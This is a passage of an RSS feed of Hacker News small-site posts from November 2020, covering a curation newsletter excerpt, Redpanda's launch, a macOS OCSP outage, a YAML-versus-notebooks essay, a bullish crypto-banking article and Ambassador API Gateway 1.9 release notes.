<li><span>“What’s amazing is how chronological feeds — essentially accidental experiments of digital architecture — have rewired our brains. In the feed, everything is fleeting. This design property means you’re either always on and connected, or you’re off and wondering if you’re missing something important.” — Sari Azout</span></li>
<li><span>“In short, the architecture of digital platforms has made us obsessive documenters and consumers of the present, yet largely indifferent to the archives we create.” — Sari Azout</span></li>
<li><span>“Blending curation and community to inhabit a space I call: new media. On the community side, we’re witnessing a shift towards a post-social media era defined by niche, gated communities of interest and purpose.” — Sari Azout</span></li>
</ul>
								</div>
								<p><img src="https://gradually.co/wp-content/themes/gradually/img/two-cents.png">
								</p><!-- end half sqaure arrow -->
								<p><span>You might be wondering why I included this in the wealthy section. It’s not a bad question! After reading this piece, I immediately thought about the amount of opportunities the “online communities at the intersection of content curation and knowledge management” space presents…I highly suggest following Sari Azout [</span><a href="https://twitter.com/sariazout"><b><i>here</i></b></a><span>] as she’s going to be announcing what she’s been working on soon 👀 </span></p>
								<p>
								<span>Share</span> (if you're an OG)  &nbsp;  <span></span><span><span>
									</span><span>


							</span></span></p></div><!-- end newsletter wrap content -->
													
						</div><!-- end newsletter wrap content -->
					</div><!-- end newsletter wrap -->
				<!--</a>-->
			</div></article><!-- #post-## -->
		</div></div>]]>
            </description>
            <link>https://gradually.co/community-curated-knowledge-networks-and-the-rise-of-the-knowledge-economy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25076142</guid>
            <pubDate>Thu, 12 Nov 2020 22:35:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[RedPanda: 10x Faster Kafka]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25075739">thread link</a>) | @sorenbs
<br/>
November 12, 2020 | https://vectorized.io/open-source/ | <a href="https://web.archive.org/web/*/https://vectorized.io/open-source/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><p><img src="https://vectorized.io/5fec7d1698c66e160017f1ad37732a09/redpanda-bsl.svg" alt="always"></p></div>
<p>We are building a real-time streaming engine for modern applications - from the enterprise to
the solo dev prototyping a react application on her laptop. We go beyond the Kafka protocol,
into the future of streaming with inline WASM transforms and geo-replicated hierarchical storage.
A new platform that scales with you from the smallest projects to petabytes of data distributed across the globe. </p>
<h2 id="Background">Background<a href="#Background" aria-label="Background permalink"></a></h2>
<p>As easy to run as <code>nginx</code>. No dependencies. Ability to flush to disk with <code>acks=-1</code>.
Leverage a huge and active ecosystem. It must be fast, really fast. With this wishlist
in mind, I wrote the first line of code of what eventually became <code>redpanda</code>. It was January 7th,
2019 and I was still living in Miami before relocating to San Francisco. I hadn’t had as much
fun hacking on anything since the initial prototype of my previous project &amp; company <a href="http://www.concord.io/" target="_self" rel="nofollow">concord.io</a>
and… it was equally all-consuming.</p>
<p>Here we are today, 22 months later. A team one dreams to be part of and a product we feel proud to
share with you. Ready to be put through the paces in even more ways that we could have anticipated,
whether embedding Redpanda in a security appliance, or using it as part of your new NodeJS application
because it’s so simple to use. Whoever you are, welcome! We are excited to have you in our community.</p>
<h2 id="Legal">Legal<a href="#Legal" aria-label="Legal permalink"></a></h2>
<p>The project is released under the Source Available License - BSL - similar to what our friends at CockroachDB have done.
We try to make this clear in the license, but worth reiterating here. Our intention is to deter cloud providers from offering our work as a service.
For 99.999% of you, restrictions will not apply - welcome to our community!</p>
<p>There will be enterprise, pay-only features that will be obvious, since to turn them on you have to
edit the <code>enterprise</code> section of the configuration. </p>
<h2 id="Getting-Started">Getting Started<a href="#Getting-Started" aria-label="Getting Started permalink"></a></h2>
<p>The simplest thing you can do is run in Docker. Follow the <a href="https://vectorized.io/rpk-container">tutorial here</a>.
But for the truly impatient, here is the executive summary: </p>
<div data-language="text"><pre><code>$ rpk container start -n 3
NODE ID  ADDRESS          CONFIG                                             
  0        172.24.1.2:9092  /home/david/.rpk/cluster/node-0/conf/redpanda.yaml  
  1        172.24.1.4:9092  /home/david/.rpk/cluster/node-1/conf/redpanda.yaml  
  2        172.24.1.3:9092  /home/david/.rpk/cluster/node-2/conf/redpanda.yaml  

Cluster started! You may use 'rpk api' to interact with the cluster. E.g:

rpk api status</code></pre></div>
<p>It says we can check our cluster with <code>rpk api status</code> Let’s try that!</p>
<div data-language="text"><pre><code>$ rpk api status
  Redpanda Cluster Status                   
                                            
  0 (172.24.1.2:9092)      (No partitions)  
                                            
  1 (172.24.1.3:9092)      (No partitions)  
                                            
  2 (172.24.1.4:9092)      (No partitions)</code></pre></div>
<p>All of the <code>rpk api</code> subcommands will detect the local cluster and use its addresses, so you don’t have to configure anything or keep track of IPs and ports.</p>
<p>For example, you can run <code>rpk api topic create</code> and it will work!</p>
<div data-language="text"><pre><code>$ rpk api topic create -p 6 -r 3 new-topic
Created topic 'new-topic'. Partitions: 6, replicas: 3, cleanup policy: 'delete'</code></pre></div>
<h2 id="Thank-you">Thank you<a href="#Thank-you" aria-label="Thank you permalink"></a></h2>
<p>This decision comes after almost a year of thinking and mentorship with a very large group of experts, OSS enthusiasts,
lawyers and quiet time thinking. Special thanks to Peter Mattis from CockroachDB for sharing his experience with BSL
which ultimately made us feel comfortable with our decision to also choose BSL. Adam Jacob for sharing his experiences with Chef,
his never-ending expertise around licensing and for taking the time to walk me through business models with me.
Thanks to Ajay Kulkarni from TimescaleDB for sharing his wealth of knowledge and experience building a community.
Thanks to Megan Gill at MongoDB for helping me better understand OSS in general, and to Gaurav Gupta now at LSVP
for helping me understand Elastic a bit better and how the OSS+Source Available has matured in the last decade.
We are better because of your advice, I am forever thankful.</p></section></div>]]>
            </description>
            <link>https://vectorized.io/open-source/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25075739</guid>
            <pubDate>Thu, 12 Nov 2020 22:04:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[New macOS update slows down older versions, literally]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25075736">thread link</a>) | @dewey
<br/>
November 12, 2020 | https://annoying.technology/posts/0f0325b37e2292f8/ | <a href="https://web.archive.org/web/*/https://annoying.technology/posts/0f0325b37e2292f8/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://d33wubrfki0l68.cloudfront.net/cbd3c98a693fe88041e8037587459629b3eef4a3/7c846/media/wellthatsjustgreat.png"></p><p>If you are running macOS you also run a service called <a href="https://www.howtogeek.com/331343/what-is-trustd-and-why-is-it-running-on-my-mac/">trustd</a> which is <a href="https://mjtsai.com/blog/2020/05/22/macos-10-15-slow-by-design/">verifying</a> the signature of installed apps. This service is calling <a href="http://ocsp.apple.com/">ocsp.apple.com</a> which is currently down, possibly related to the (also not accessible) software update service.</p><p>Result: Apps take minutes to start, your Mac grinds to a halt with no indication what’s going on.</p><p>Workarounds proposed <a href="https://twitter.com/lapcatsoftware/status/1326990296412991489">on Twitter</a> include pointing ocsp.apple.com to localhost.</p><p>It just works!</p></div></div>]]>
            </description>
            <link>https://annoying.technology/posts/0f0325b37e2292f8/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25075736</guid>
            <pubDate>Thu, 12 Nov 2020 22:04:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why we use YAML, not notebooks, for machine learning]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25075305">thread link</a>) | @sheepstrat
<br/>
November 12, 2020 | http://www.cortex.dev/post/yaml-not-notebooks-for-machine-learning | <a href="https://web.archive.org/web/*/http://www.cortex.dev/post/yaml-not-notebooks-for-machine-learning">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div content-type="article"><p>Most data scientists spend the majority of their working hours in a notebook. As a result, most production machine learning platforms prioritize notebook support. If you try out a new production ML platform, chances are its onboarding tutorial will begin with a .ipynb file.</p><p>When we built <a href="https://github.com/cortexlabs/cortex" target="_blank">Cortex</a> we spent a lot of time considering the correct interface for defining production ML pipelines. Ultimately, we decided <em>not</em> to support notebooks, opting instead for YAML config files.</p><h3>Notebooks were designed for experimentation</h3><p>Notebooks are the modern incarnation of literate programming, a paradigm introduced in the ‘80s that sought to write code that reflected the programmer’s thoughts—not the computer’s processing—by combining code with natural language.</p><p>In all literate programming tools, the emphasis is on presentation, which is a big reason why notebooks are so useful.</p><p>For many data scientists, the finished product of a work session is a business analysis. They need to show team members—who oftentimes aren’t technical—how their data became a specific recommendation or insight.</p><p>A notebook, where paragraphs of formatted text can lay between cells of code and where charts can be displayed directly beneath the code that generates them, is an ideal format for this presentation.</p><p>Even better, notebooks are interactive. Want to see what the chart looks like with a second dataset? Just add a new cell. Want to test a different model? Tweak one line of code and rerun the cell.</p><p>However, the same qualities that make notebooks great for exploring and explaining data make them a poor fit for production.</p><h3>Why we use YAML for production machine learning</h3><p>When I say production machine learning, I’m referring to machine learning that manifests as a product feature. For example, Uber’s ETA prediction, or Gmail’s Smart Compose.</p><p>The priorities in building a production machine learning pipeline—the series of steps that take you from raw data to product—are not fundamentally different from those of general software engineering. Specifically, they are:</p><h4>1. Your pipeline should be reproducible</h4><p>Reproducibility is an issue with notebooks. Because of the hidden state and the potential for arbitrary execution order, generating a result in a notebook isn’t always as simple as clicking “Run All.” Just having another engineer reproduce your results—let alone having your code run automatically as part of a pipeline—is a significant challenge.</p><p>Instead of trying to streamline a notebook’s various imports and function calls into a more easily reproducible script, why not use something simple and declarative like YAML?</p><p>For example, this this cortex.yaml file defines the deployment stage of a pipeline:</p><p>The code to be executed, predictor.py, is clear, as are its configuration variables. It’s simple, readable, and will produce predictable results.</p><p>Now, there are some projects focused on parameterizing notebooks so that they can be treated as pure functions, but it’s always felt like an unnecessary “square peg in a round hole” effort to me.</p><h4>2. Collaborating on your pipeline should be easy</h4><p>Version control is at the heart of any modern engineering org. The ability for multiple engineers to asynchronously contribute to a codebase is crucial—and with notebooks, it’s very hard.</p><p>Git works by tracking the plaintext differences between file versions. With code, this results in a very readable experience, where you can easily visualize what is changing and how it impacts the software:</p><figure id="w-node-d5436ba7f36f-258b12d0"><p><img src="https://uploads-ssl.webflow.com/5f6030edfd63364a668b1265/5fada6aeb4f157689fec70b5_1*q3gmY030tYrPFREYhjuGXA.png" alt=""></p><figcaption><a href="https://github.com/cortexlabs/cortex" target="_blank"></a></figcaption></figure><p>Notebook files, however, are essentially giant JSON documents that contain the base-64 encoding of images and binary data. For a complex notebook, it would be extremely hard for anyone to read through a plaintext diff and draw meaningful conclusions—a lot of it would just be rearranged JSON and unintelligible blocks of base-64.</p><p>When you combine this with the frailty of complicated notebooks, where cells often need to be run in an arbitrary but precise order to generate the right result, it makes collaboration tricky.</p><p>For example, imagine you had an ETA prediction feature, and your pipeline relied on a complicated notebook to export a trained model. No one would be able to work on the notebook, as any small tweak might lead to invisible but cascading changes, such that your model performs poorly.</p><p>Trying to reverse engineer what changes caused the performance drop would be hopeless, both because of the unreadable nature of notebook diffs and because of the explainability problems mentioned earlier. Your pipeline would, in essence, have a “don’t touch it or it will break” sign on it.</p><p>With YAML, however, this problem is solved. There is no hidden state or arbitrary execution order in a YAML file, and any changes you make to it can easily be tracked by Git:</p><figure id="w-node-e3057d2124b7-258b12d0"><p><img src="https://uploads-ssl.webflow.com/5f6030edfd63364a668b1265/5fada6aefc44fcdc3d9da40a_1*KJDREXDrxueoMiPyfjewhg.png" alt=""></p><figcaption><a href="https://github.com/cortexlabs/cortex" target="_blank"></a></figcaption></figure><p>If one of those changes breaks your model, it’s both reversible and investigable.</p><p>As with the last example, there are some projects dedicated to making diffing and merging notebooks easier, but it seems like a lot of effort to emulate YAML’s default nature.</p><h4>3. All code in your pipeline should be testable</h4><p>Connected to both of the above points, most modern engineering orgs (hopefully) have a process for testing code. Typically, it looks something like this:</p><ul role="list"><li>Engineers write tests before pushing any code.</li><li>PRs are automatically reviewed by CI/CD tooling.</li><li>A final manual review is given by another engineer.</li></ul><p>As a result, anytime the codebase is changed, it is done with the highest possible level of confidence that it will not break things.</p><p>With notebooks, this is difficult.</p><p>Python unit testing libraries, like unittest, can be used within a notebook, but standard CI/CD tooling has trouble dealing with notebooks for the same reasons that notebook diffs are hard to read.</p><p>As a result, it’s hard to ship a new notebook to production with a high level of confidence that it won’t break anything—and if something does break, good luck figuring out why.</p><p>Applying CI/CD to YAML files and the code they reference, on the other hand, is straightforward. Devops teams have been doing it for years.</p><h3>Production machine learning is an engineering discipline</h3><p>We built Cortex specifically because we wanted to build things like Spotify’s “Made For You” playlist or Gmail’s Smart Compose. Our focus was not on designing new models, but on building a pipeline to turn models into products.</p><p>To do that, we needed to build an interface that allowed users to specify which code should be executed at what time, with which configuration.</p><p>YAML and notebooks are both tools for that purpose, in a sense. A notebook, at a very basic level, is just a bunch of JSON that references blocks of code and the order in which they should be executed.</p><p>But notebooks prioritize presentation and interactivity at the expense of reproducibility. YAML is the other side of that coin, ignoring presentation in favor of simplicity and reproducibility—making it much better for production.</p><p>‍</p></div></div>]]>
            </description>
            <link>http://www.cortex.dev/post/yaml-not-notebooks-for-machine-learning</link>
            <guid isPermaLink="false">hacker-news-small-sites-25075305</guid>
            <pubDate>Thu, 12 Nov 2020 21:27:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[It’s Not Long Before Your Bank Will Begin Accepting Bitcoin and Crypto]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25074935">thread link</a>) | @URfejk
<br/>
November 12, 2020 | https://www.cryptovantage.com/news/its-not-long-before-your-bank-will-begin-accepting-bitcoin-and-crypto/ | <a href="https://web.archive.org/web/*/https://www.cryptovantage.com/news/its-not-long-before-your-bank-will-begin-accepting-bitcoin-and-crypto/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                            <div>
                                <div><p dir="ltr">This is a difficult question to answer, since no major bank has given any concrete indication that it plans to begin accepting and holding actual deposits in cryptocurrency. However, with <a href="https://www.cryptovantage.com/news/paypal-bitcoin-is-big-news-for-crypto-but-exchanges-have-a-big-edge/" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.cryptovantage.com/news/paypal-bitcoin-is-big-news-for-crypto-but-exchanges-have-a-big-edge/&amp;source=gmail&amp;ust=1604594295417000&amp;usg=AFQjCNEXjCqoMJV5LPR9bVZNhvwsvn3HXg">PayPal launching cryptocurrency trading/holding services</a>, it must be only a matter of time before they begin offering their own similar services, for fear of being left behind.</p>
<h2 dir="ltr">Silvergate Bank Profits From Accepting Crypto Business</h2>
<p dir="ltr">Silvergate Bank was one of the first traditional financial institutions to get in on the act of accepting business from cryptocurrency firms. Back in Q4 2017, <a href="https://www.forbes.com/sites/michaeldelcastillo/2020/10/26/silvergate-breaks-record-with-586-million-in-cryptocurrency-deposits/?sh=1c86b3395cc3" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.forbes.com/sites/michaeldelcastillo/2020/10/26/silvergate-breaks-record-with-586-million-in-cryptocurrency-deposits/?sh%3D1c86b3395cc3&amp;source=gmail&amp;ust=1604594295417000&amp;usg=AFQjCNHGkH26Ap1B-mB51eGqDH2wM_BpHQ">it took in $835 million in deposits from crypto companies</a>.</p>
<p dir="ltr">This remains its record, but after falling in the months following Q4 2017, its crypto-related deposits have begun climbing up again this year. Not only did it accept $586 million in deposits from crypto firms, but <a href="http://d18rn0p25nwr6d.cloudfront.net/CIK-0001312109/ae7d42e6-6304-4c40-a07d-ef393c80c445.pdf" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=http://d18rn0p25nwr6d.cloudfront.net/CIK-0001312109/ae7d42e6-6304-4c40-a07d-ef393c80c445.pdf&amp;source=gmail&amp;ust=1604594295417000&amp;usg=AFQjCNG7t35yFTgpJ4-azduYImlxDURbUw">its fees from digital currency customers increased by 107%</a> (or by $2.1 million) in the year to June 30, 2020, rising from $2 million to $4.1 million.</p>
<p dir="ltr">In other words, the bank has doubled its cryptocurrency business over the past year, and recent events elsewhere in the world of crypto suggest that this business will only continue growing.</p>
<p dir="ltr">“The Bank’s infrastructure has provided Silvergate with the foundation to succeed in what has become a very digital world and we see an ample runway for further growth,” <a href="https://markets.ft.com/data/announce/detail?dockey=600-202010260625BIZWIRE_USPRX____BW5227-1" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://markets.ft.com/data/announce/detail?dockey%3D600-202010260625BIZWIRE_USPRX____BW5227-1&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNGYLsM56ADZH4gF8FvhIYjZeTHXEA">said Alan Lane</a>, the bank’s CEO.</p>
<p dir="ltr">That there’s an ample runway for further growth is indicated by a number of market and regulatory developments.</p>
<p dir="ltr">Most notably, the price of bitcoin has jumped by over 30% in less than 30 days, with BTC costing $10,552 on October 8 and touching as high as $15,909 November 5.</p>
<p dir="ltr"><img tabindex="0" src="https://lh6.googleusercontent.com/miITOPXIeQF1FKAOPmFwdjB_HSVUZBcSts5F18wxDSrpua8sotqsXlvBXWm86JE2_ZNP_X_9ZzfABY8ZhfteD580w6XwN-9QkvNVqkGmf_l0vBZdGMkXt_ZyeMA3I6z2-dU2bFyR" width="624" height="365"></p>
<p dir="ltr"><em>Source: CoinGecko</em></p>
<p dir="ltr">This growth has been spurred by a number of factors which will continue to push bitcoin’s price higher, such as PayPal’s aforementioned announcement, as well as <a href="https://www.cryptovantage.com/news/square-follows-microstrategy-buys-50-million-worth-of-bitcoin/" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.cryptovantage.com/news/square-follows-microstrategy-buys-50-million-worth-of-bitcoin/&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNHF2m3P48ZJKH_S_-KzCFKilKrf2w">recent moves by the likes of MicroStrategy and Square to make bitcoin a reserve asset.</a></p>
<p dir="ltr">But on the regulatory side, the <a href="https://www.occ.gov/news-issuances/news-releases/2020/nr-occ-2020-98.html" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.occ.gov/news-issuances/news-releases/2020/nr-occ-2020-98.html&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNHFmiPt9-a-o4pPC2s4CEFupfpRew">U.S. Office of the Comptroller of the Currency announced in July</a> that federally chartered banks may provide cryptocurrency custody services.</p>
<p dir="ltr">“The OCC has found that the authority to provide safekeeping services extends to digital activities and, specifically, that national banks may escrow encryption keys used in connection with digital certificates because a key escrow service is a functional equivalent to physical safekeeping,” it wrote in a letter.</p>
<p dir="ltr">This was — and still is — very significant news. The OCC’s letter was a response to JPMorgan’s May decision to <a href="https://www.cryptovantage.com/news/jp-morgan-accepts-cryptocurrency/" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.cryptovantage.com/news/jp-morgan-accepts-cryptocurrency/&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNHKXUipyU4sf3q-rmwKBjJ6QT9fNw">provide banking services to two major crypto-exchanges</a>, Coinbase and Gemini. It was <a href="https://www.bloomberg.com/news/articles/2020-05-12/jpmorgan-is-now-banking-for-bitcoin-exchanges-coinbase-gemini" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.bloomberg.com/news/articles/2020-05-12/jpmorgan-is-now-banking-for-bitcoin-exchanges-coinbase-gemini&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNEZupX_7nKdmURa0GOv52zvrnM2GQ">reported at the time</a> that JPMorgan won’t be handling actual cryptocurrencies, but with the OCC’s directive confirming that it’s legal for banks to hold crypto, these two events pave the way for major American banks to begin offering cryptocurrency custody services.</p>
<h2 dir="ltr">The Inevitability of Cryptocurrency</h2>
<p dir="ltr">The specific timeframe can’t be known for sure, but it now looks almost inevitable that major banks will be letting customers hold crypto with them in the not-too distant future.</p>
<p dir="ltr">With <a href="https://capital.com/10bn-asset-manager-calls-bitcoin-its-primary-treasury-reserve-asset" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://capital.com/10bn-asset-manager-calls-bitcoin-its-primary-treasury-reserve-asset&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNGrQURQ-LDJe0ShPrlZ51DJ3t5HGQ">new companies</a> announcing their own <a href="https://www.finextra.com/newsarticle/36790/mode-invests-10-of-cash-reserves-in-bitcoin" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.finextra.com/newsarticle/36790/mode-invests-10-of-cash-reserves-in-bitcoin&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNFHbymiMLVIy6kiPzrYCFfUAqc2mA">purchases of bitcoin as a reserve asset</a> virtually every week, there’s a rising demand for custodial services that banks will almost certainly want to meet, on pain of losing business to upstarts.</p>
<p dir="ltr">In fact, a small number of banks have already begun meeting this demand, indicating that most others will eventually follow. In the United States, <a href="https://www.nasdaq.com/articles/standard-chartered-to-launch-institutional-crypto-custody-solution-2020-07-20" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.nasdaq.com/articles/standard-chartered-to-launch-institutional-crypto-custody-solution-2020-07-20&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNFRQ8IdP1r2k4jGQEOJ5a5SMimsWg">Standard Chartered began offering a cryptocurrency custody service for institutions</a> in July, while <a href="https://www.fintechfutures.com/2020/08/kb-kookmin-continues-crypto-custody-development-with-new-partners" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.fintechfutures.com/2020/08/kb-kookmin-continues-crypto-custody-development-with-new-partners&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNEXV1Bc628yoW0ECEzF17DqQZ2RIg">South Korea’s KB Kookmin Bank began doing something very similar</a> in August.</p>
<p dir="ltr">But banks won’t stop with custody services for institutions. With PayPal taking an early lead in offering cryptocurrency buying-selling and holding services, it’s highly likely that banks will follow, again out of fear of being left behind.</p>
<p dir="ltr">PayPal’s effect on major banks was almost immediate, with a small number announcing cryptocurrency-related initiatives in the days and weeks following PayPal’s own announcement.</p>
<p dir="ltr">In Switzerland, <a href="https://www.financemagnates.com/cryptocurrency/news/switzerland-to-allow-russian-gazprombank-subsidiary-to-offer-crypto-services/" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.financemagnates.com/cryptocurrency/news/switzerland-to-allow-russian-gazprombank-subsidiary-to-offer-crypto-services/&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNGPYHRZZ2cAkdgQqrnakjFOEYe99A">Gazprombank announced it would be offering crypto-trading services</a>, while Singapore’s DBS Bank <a href="https://www.financemagnates.com/cryptocurrency/news/dbs-bank-is-launching-crypto-exchange-with-multi-fiat-support/" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.financemagnates.com/cryptocurrency/news/dbs-bank-is-launching-crypto-exchange-with-multi-fiat-support/&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNGH9iejoYibtml-fq2LIEf5Wp6tUA">announced its own exchange</a>, complete with custody solutions. And in Mongolia, <a href="https://thepaypers.com/cryptocurrencies/tdb-bank-of-mongolia-to-offer-crypto-related-services--1245432" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://thepaypers.com/cryptocurrencies/tdb-bank-of-mongolia-to-offer-crypto-related-services--1245432&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNFCmGokM90GubRwoP03M6lOHqn_hQ">TDB Bank announced a wide suite of crypto services</a>, including custody, deposits, remittances, loans, and crypto-asset management.</p>
<p dir="ltr"><img tabindex="0" src="https://lh3.googleusercontent.com/SzYr3KtbvtnkezoacxKJHOBpr9IySdQTEbPQ28B_yyhVHV1-IKSUdmDc9zdrS3QhkJGQtzsL9tzfQYEMK_W-ppbR-XfLCg3GYkJ8FD5eIW07bWt0zOn_PKrM_SFngGp9WbtEkZev" width="624" height="459"></p>
<p dir="ltr"><em>Source: Twitter</em></p>
<p dir="ltr">The floodgates are now open, and it’s only a matter of time before larger numbers of major banks elsewhere follow suit. And as <a href="https://twitter.com/TheCryptoLark/status/1322628935344029696" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://twitter.com/TheCryptoLark/status/1322628935344029696&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNEwISBQrymPmIx2lVaKgMFY49pfEQ">the tweet above</a> indicates, central banks may also warm to bitcoin, making it easier for commercial banks to follow.</p>
<h2 dir="ltr">What This Means For Bitcoin</h2>
<p dir="ltr">Needless to say, this is all highly bullish for Bitcoin, and for crypto in general. By making cryptocurrency more accessible to a wider customer base of consumers and businesses, banks will feed demand for crypto. They’ll endow cryptocurrency with a stronger reputation that will draw additional investors, and in the process these additional investors will push the price of bitcoin and other cryptocurrencies higher.</p>
<p dir="ltr">At the same time, the involvement of banks will also potentially invite stricter regulation from national governments and regulators. With major banks exposing themselves to crypto, governments will want to make sure that the financial system doesn’t end up becoming more vulnerable to instability. However, while this may suggest a reining in of crypto to an extent, an increase in regulation will ultimately provide further reassurance to retail and institutional investors, pushing demand for crypto upwards.</p>
<p dir="ltr">In sum, banks will be good for crypto, and crypto will be good for banks.</p>
</div>
                            </div>
                             
                        </div></div>]]>
            </description>
            <link>https://www.cryptovantage.com/news/its-not-long-before-your-bank-will-begin-accepting-bitcoin-and-crypto/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25074935</guid>
            <pubDate>Thu, 12 Nov 2020 20:58:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kubernetes-native Ambassador API Gateway 1.9 released]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25074560">thread link</a>) | @rdli
<br/>
November 12, 2020 | https://blog.getambassador.io/custom-error-responses-oauth2-improvements-live-debugging-flexible-dev-portal-3c98e9e978bb | <a href="https://web.archive.org/web/*/https://blog.getambassador.io/custom-error-responses-oauth2-improvements-live-debugging-flexible-dev-portal-3c98e9e978bb">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><h2 id="f07a">FEATURE RELEASE</h2><h2 id="c250">Edge Stack and API Gateway 1.9 available</h2><div><div><div><p><a href="https://medium.com/@rdli?source=post_page-----3c98e9e978bb--------------------------------" rel="noopener"><img alt="Richard Li" src="https://miro.medium.com/fit/c/96/96/0*ZzZAOu8-_Umpg5BM.jpeg" width="48" height="48"></a></p></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/10000/1*VrrAAgbxH5tjXjRX9uux0g.png" width="5000" height="2708" srcset="https://miro.medium.com/max/552/1*VrrAAgbxH5tjXjRX9uux0g.png 276w, https://miro.medium.com/max/1104/1*VrrAAgbxH5tjXjRX9uux0g.png 552w, https://miro.medium.com/max/1280/1*VrrAAgbxH5tjXjRX9uux0g.png 640w, https://miro.medium.com/max/1400/1*VrrAAgbxH5tjXjRX9uux0g.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*VrrAAgbxH5tjXjRX9uux0g.png?q=20"></p></div></div></div></figure><p id="a0c3">We’re excited to announce the release of the Ambassador API Gateway and Edge Stack 1.9. This major release adds support for commonly requested use cases, including custom error responses, a more flexible developer portal, OAuth2 improvements, and more “production-at-scale” enhancements.</p><p id="46b7">Generic 404 error pages, begone! The 1.9 release adds support for custom error responses based on HTTP status codes. The mechanism introduced in this release is very flexible, supporting custom error responses on both a per <code>Mapping</code> basis and a per <code>module</code> basis.</p><p id="1394">Here’s a sample configuration:</p><pre><span id="0e09">apiVersion: getambassador.io/v2<br>kind: Module<br>metadata:<br>  name: ambassador<br>  namespace: ambassador<br>spec:<br>  config:<br>    error_response_overrides:<br>      - on_status_code: 404<br>        body:<br>          text_format: "File not found"<br>      - on_status_code: 500<br>        body:<br>          json_format:<br>            error: "Application error"<br>            status: "%RESPONSE_CODE%"<br>            cluster: "%UPSTREAM_CLUSTER%"</span></pre><p id="ccb1">For more complex error responses, the response can be written as a separate HTML document and does not need to be inline with the configuration.</p><p id="4602">OAuth2 is a complex specification. In 1.9, the <code>OAuth2</code> filter now supports every draft of the scope validation specification (RFC 8693). Also, support for inheriting scope arguments when delegating to a <code>JWT</code> filter from an <code>OAuth2</code> filter are now supported. This ensures compatibility with a much broader range of Identity Providers, which implement different drafts of the OAuth2 specification.</p><p id="5e56">The <code>OAuth2</code> filter now supports RFC 7523 JWT assertions. This enables more use cases, e.g., using asymmetric cryptography to authenticate to Azure instead of a shared password.</p><figure><div></div><figcaption>OAuth2 improvements in Edge Stack 1.9</figcaption></figure><p id="71dc">The Developer Portal now supports:</p><ul><li id="6f58">Swagger/OpenAPI docs published at arbitrary URLs</li><li id="3062">Selecting specific services to display in the portal</li><li id="7a6f">Support for public/private API documentation</li></ul><p id="5584">These configurations are part of the <code>DevPortal</code> resource which dynamically configures the Developer Portal. Automatic polling of all documentation is now off by default, and a new attribute, <code>docs</code>, on <code>Mapping</code> resources is used to configure API documentation. Here’s an example:</p><pre><span id="bc18">apiVersion: getambassador.io/v2<br>kind:  Mapping<br>metadata:<br>  name:  service-a<br>spec:<br>  prefix: /service-a/<br>  rewrite: /srv/<br>  service: service-a:5000<br>  docs:<br>    path: /openapi/<br>---<br>apiVersion: getambassador.io/v2<br>kind:  DevPortal<br>metadata:<br>  name:  ambassador<br>spec:<br>  default: true<br>  content:<br>    url: https://github.com/datawire/devportal-content.git<br>  selector:<br>    matchLabels:<br>      public-api: "true" 